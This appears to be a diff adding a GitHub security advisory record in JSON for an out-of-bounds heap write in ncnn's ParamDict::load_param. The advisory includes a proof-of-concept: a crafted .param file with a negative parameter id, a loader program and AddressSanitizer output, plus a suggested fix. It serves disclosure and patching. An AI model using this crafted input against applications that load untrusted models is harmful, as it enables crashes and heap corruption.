@@ -1,0 +1,130 @@
+{
+  "ghsa_id": "GHSA-jxmc-3mv6-7pwr",
+  "cve_id": "CVE-2026-50144",
+  "url": "https://api.github.com/repos/Tencent/ncnn/security-advisories/GHSA-jxmc-3mv6-7pwr",
+  "html_url": "https://github.com/Tencent/ncnn/security/advisories/GHSA-jxmc-3mv6-7pwr",
+  "summary": "Out-of-bounds heap write in ParamDict::load_param via unchecked negative parameter id",
+  "description": "### Summary\r\n\r\nAn out-of-bounds heap write (CWE-787) in `ncnn::ParamDict::load_param()` allows a\r\nmalicious `.param` model file to corrupt heap memory when the file is loaded with\r\n`Net::load_param()`. The parameter id parsed from the file is a signed integer that is\r\nonly validated against an upper bound (`id >= NCNN_MAX_PARAM_COUNT`); a negative id in\r\nthe range `[-23299, -1]` bypasses the check and is used directly as an index into the\r\nfixed-size `params[NCNN_MAX_PARAM_COUNT]` array, producing a write before the\r\nallocation. Both the write offset (chosen via the negative id) and the written 4-byte\r\nvalue (the integer/float after `=`) are attacker-controlled, and the faulting address is\r\ncomputed deterministically, so this is a reliable, controllable relative out-of-bounds\r\nwrite reachable from the public model-loading API - usable for denial of service and a\r\ncandidate primitive for memory corruption / potential code execution at model load time.\r\n\r\n### Details\r\n\r\n`ParamDict::load_param(const DataReader&)` parses the trailing `key=value` pairs of each\r\nlayer line in a `.param` file. The key (`id`) is read as a signed `int` and validated\r\nwith only an upper bound:\r\n\r\n`src/paramdict.cpp`:\r\n\r\n```cpp\r\nint id = 0;\r\nwhile (dr.scan(\"%d=\", &id) == 1) // (1) id is a SIGNED int taken from the file\r\n{\r\n bool is_array = id <= -23300; // (2) only id <= -23300 is treated as an array key\r\n if (is_array)\r\n {\r\n id = -id - 23300; // ...and normalized back to a non-negative index\r\n }\r\n\r\n if (id >= NCNN_MAX_PARAM_COUNT) // (3) ONLY an upper-bound check; no `id < 0` check\r\n {\r\n NCNN_LOGE(\"id < NCNN_MAX_PARAM_COUNT failed (id=%d, NCNN_MAX_PARAM_COUNT=%d)\", id, NCNN_MAX_PARAM_COUNT);\r\n return -1;\r\n }\r\n ...\r\n // scalar (non-array) value path:\r\n d->params[id].f = vstr_to_float(vstr); // line 471 (float)\r\n ...\r\n nscan = sscanf(vstr, \"%d\", &d->params[id].i); // line 475 (int) <-- OOB write\r\n```\r\n\r\n`d->params` is a fixed-size array `params[NCNN_MAX_PARAM_COUNT]` (`NCNN_MAX_PARAM_COUNT == 32`)\r\nembedded in the heap-allocated `ParamDictPrivate` object `d` (allocated in\r\n`ParamDict::ParamDict()`, `src/paramdict.cpp:43`).\r\n\r\nA scalar key such as `-1=...` produces `id = -1`. Because `-1 > -23300`, `is_array` is\r\nfalse and no normalization occurs; because `-1 < 32`, the upper-bound check at (3)\r\npasses. The parsed value is then written to `d->params[-1]`, i.e. `sizeof(Param)` bytes\r\n*before* the start of the `params` array - an out-of-bounds write into heap memory\r\npreceding the allocation.\r\n\r\nAttacker control:\r\n- **Offset (where):** the attacker chooses `id` in `[-23299, -1]`; the write lands at\r\n `&d->params[0] + id * sizeof(Param) + offsetof(Param, i)`, i.e. up to roughly\r\n `23299 * sizeof(Param)` bytes before the allocation. (`id <= -23300` is interpreted as\r\n an array key and normalized to a non-negative index, so it is outside the\r\n negative-OOB range.)\r\n- **Value (what):** the 4 bytes written are the integer (`.i`, via `sscanf(\"%d\")`) or\r\n float (`.f`) value after `=`, fully attacker-controlled.\r\n- **Determinism:** the destination is computed arithmetically and does not depend on\r\n uninitialized memory, so the write reproduces reliably.\r\n\r\nCall path from the public API:\r\n\r\n```\r\nNet::load_param(const char* path) // src/net.cpp:1956\r\n -> Net::load_param(FILE*) // src/net.cpp:1937\r\n -> Net::load_param(const DataReader&) // src/net.cpp (per layer)\r\n -> ParamDict::load_param(const DataReader&) // src/paramdict.cpp:475 <-- OOB write\r\n```\r\n\r\nThe same incomplete check (`id >= NCNN_MAX_PARAM_COUNT` only) is also present in the\r\nbinary parameter loader in the same file (around `src/paramdict.cpp:534`), which reads\r\n`id` from a `.param.bin` file; the fix below should be applied to both sites.\r\n\r\nRelated (separate) weakness for awareness: the array path\r\n(`src/paramdict.cpp:~289-318`) reads the array length `len` from the file and uses it for\r\n`d->params[id].v.create(len)` followed by a `ptr[j] = ...` write loop; oversized/invalid\r\n`len` values were also observed to cause out-of-bounds access / huge allocations during\r\ntesting. This can be addressed separately.\r\n\r\n### PoC\r\n\r\nAffected build: current `master`, confirmed at commit\r\n`e54f7b1f88434e1d844ea0551b880a1cfb079ce1` (the incomplete check at `paramdict.cpp:280`\r\nand `:534` is unchanged on `master`).\r\n\r\n1. Build ncnn with AddressSanitizer (to observe the overflow cleanly):\r\n\r\n ```bash\r\n cmake -S ncnn -B build -DCMAKE_BUILD_TYPE=RelWithDebInfo \\\r\n -DCMAKE_CXX_FLAGS=\"-fsanitize=address -g\" -DNCNN_VULKAN=OFF \\\r\n -DNCNN_BUILD_TESTS=OFF -DNCNN_BUILD_EXAMPLES=OFF -DNCNN_BUILD_TOOLS=OFF\r\n cmake --build build -j\r\n ```\r\n\r\n2. Create a malicious `.param` file (`poc.param`). `-1=305419896` is the malicious\r\n pair: id `-1` (out of bounds) and value `305419896` = `0x12345678` (the\r\n attacker-controlled 4 bytes written):\r\n\r\n ```\r\n 7767517\r\n 1 1\r\n Input data 0 1 data -1=305419896\r\n ```\r\n\r\n (`7767517` = required magic; `1 1` = one layer, one blob; the `Input` layer is normal;\r\n the out-of-bounds write happens while parsing `-1=305419896`.)\r\n\r\n3. Load it through the public API:\r\n\r\n ```cpp\r\n #include \"net.h\"\r\n int main() {\r\n ncnn::Net net;\r\n net.opt.use_vulkan_compute = false;\r\n net.load_param(\"poc.param\"); // out-of-bounds write occurs here\r\n return 0;\r\n }\r\n ```\r\n\r\n ```bash\r\n ASAN_OPTIONS=symbolize=1 ./poc\r\n ```\r\n\r\nObserved AddressSanitizer output (local absolute paths scrubbed; build-specific\r\naddresses elided):\r\n\r\n```\r\n==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...\r\nWRITE of size 4 at 0x... thread T0\r\n #0 scanf_common(...) asan_interceptors\r\n #1 __isoc23_sscanf\r\n #2 ncnn::ParamDict::load_param(ncnn::DataReader const&) src/paramdict.cpp:475\r\n #3 ncnn::Net::load_param(ncnn::DataReader const&) src/net.cpp:1226\r\n #4 ncnn::Net::load_param(_IO_FILE*) src/net.cpp:1937\r\n #5 ncnn::Net::load_param(char const*) src/net.cpp:1956\r\n #6 main\r\n\r\n0x... is located 108 bytes before a 3584-byte region\r\nallocated by thread T0 here:\r\n #1 ncnn::ParamDict::ParamDict() src/paramdict.cpp:43\r\n #2 ncnn::Net::load_param(ncnn::DataReader const&) src/net.cpp:1134\r\nSUMMARY: AddressSanitizer: heap-buffer-overflow in scanf_common(...)\r\n```\r\n\r\nThe reported region size and offset are build-specific. On the tested build\r\n`sizeof(Param) == 112` and `NCNN_MAX_PARAM_COUNT == 32`, so the backing allocation is\r\n`32 * 112 = 3584` bytes and `id = -1` writes `108 = (-1)*112 + offsetof(Param, i)=4`\r\nbytes before it. These exact numbers depend on compiler/platform/struct layout, but the\r\ndefect (a negative `id` indexing `params[id]`) is platform-independent and the PoC above\r\ntriggers it regardless.\r\n\r\nNote on impact reliability: with `id = -1` the write lands in the ASan redzone and is\r\nreported. With other offsets (e.g. `id = -2`) the write can land in live, addressable\r\nheap memory, in which case no sanitizer error is raised and loading continues while a\r\nneighboring heap object is silently corrupted - the practically dangerous case.\r\n\r\n### Impact\r\n\r\nType: out-of-bounds heap write (CWE-787; also CWE-129 improper validation of array\r\nindex, CWE-20 improper input validation).\r\n\r\nAny application that calls `Net::load_param()` (or `load_param_mem()`) on an\r\nattacker-supplied or attacker-influenced `.param` file is affected. Model/param files\r\nare commonly shared, downloaded, or accepted as input, so this is reachable at model\r\nload time. The write has an attacker-controlled offset and an attacker-controlled 4-byte\r\nvalue and is deterministic, which makes it a controllable relative out-of-bounds write:\r\ndepending on the chosen offset it causes a crash (denial of service) or silent\r\ncorruption of adjacent heap state, the latter providing a primitive that may be\r\ndeveloped toward control-flow hijacking / code execution. A full weaponized exploit was\r\nnot developed and is not required to establish the memory-safety defect.\r\n\r\nSuggested severity: High. Suggested vector\r\n`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` (7.1); if an integrating application\r\nloads model files from untrusted remote sources the vector is effectively `AV:N`, which\r\nraises the score.\r\n\r\nSuggested fix: add the missing lower-bound check (and apply it to the binary loader at\r\n`paramdict.cpp:~534` as well):\r\n\r\n```cpp\r\n- if (id >= NCNN_MAX_PARAM_COUNT)\r\n+ if (id < 0 || id >= NCNN_MAX_PARAM_COUNT)\r\n {\r\n NCNN_LOGE(\"id < NCNN_MAX_PARAM_COUNT failed (id=%d, NCNN_MAX_PARAM_COUNT=%d)\", id, NCNN_MAX_PARAM_COUNT);\r\n return -1;\r\n }\r\n```",
+  "severity": "high",
+  "author": null,
+  "publisher": {
+    "login": "nihui",
+    "id": 171016,
+    "node_id": "MDQ6VXNlcjE3MTAxNg==",
+    "avatar_url": "https://avatars.githubusercontent.com/u/171016?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/nihui",
+    "html_url": "https://github.com/nihui",
+    "followers_url": "https://api.github.com/users/nihui/followers",
+    "following_url": "https://api.github.com/users/nihui/following{/other_user}",
+    "gists_url": "https://api.github.com/users/nihui/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/nihui/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/nihui/subscriptions",
+    "organizations_url": "https://api.github.com/users/nihui/orgs",
+    "repos_url": "https://api.github.com/users/nihui/repos",
+    "events_url": "https://api.github.com/users/nihui/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/nihui/received_events",
+    "type": "User",
+    "user_view_type": "public",
+    "site_admin": false
+  },
+  "identifiers": [
+    {
+      "value": "GHSA-jxmc-3mv6-7pwr",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2026-50144",
+      "type": "CVE"
+    }
+  ],
+  "state": "published",
+  "created_at": null,
+  "updated_at": "2026-06-03T22:03:17Z",
+  "published_at": "2026-05-28T11:53:34Z",
+  "closed_at": null,
+  "withdrawn_at": null,
+  "submission": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "",
+        "name": "ncnn"
+      },
+      "vulnerable_version_range": "<= e54f7b1f88434e1d844ea0551b880a1cfb079ce1",
+      "patched_versions": "",
+      "vulnerable_functions": [
+
+      ]
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H",
+      "score": 7.1
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  "cwes": [
+    {
+      "cwe_id": "CWE-20",
+      "name": "Improper Input Validation"
+    },
+    {
+      "cwe_id": "CWE-129",
+      "name": "Improper Validation of Array Index"
+    },
+    {
+      "cwe_id": "CWE-787",
+      "name": "Out-of-bounds Write"
+    }
+  ],
+  "cwe_ids": [
+    "CWE-20",
+    "CWE-129",
+    "CWE-787"
+  ],
+  "credits": [
+    {
+      "login": "aleff-github",
+      "type": "reporter"
+    }
+  ],
+  "credits_detailed": [
+    {
+      "user": {
+        "login": "aleff-github",
+        "id": 58374531,
+        "node_id": "MDQ6VXNlcjU4Mzc0NTMx",
+        "avatar_url": "https://avatars.githubusercontent.com/u/58374531?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/aleff-github",
+        "html_url": "https://github.com/aleff-github",
+        "followers_url": "https://api.github.com/users/aleff-github/followers",
+        "following_url": "https://api.github.com/users/aleff-github/following{/other_user}",
+        "gists_url": "https://api.github.com/users/aleff-github/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/aleff-github/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/aleff-github/subscriptions",
+        "organizations_url": "https://api.github.com/users/aleff-github/orgs",
+        "repos_url": "https://api.github.com/users/aleff-github/repos",
+        "events_url": "https://api.github.com/users/aleff-github/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/aleff-github/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter",
+      "state": "accepted"
+    }
+  ],
+  "collaborating_users": null,
+  "collaborating_teams": null,
+  "private_fork": null,
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H",
+    "score": 7.1
+  }
+}
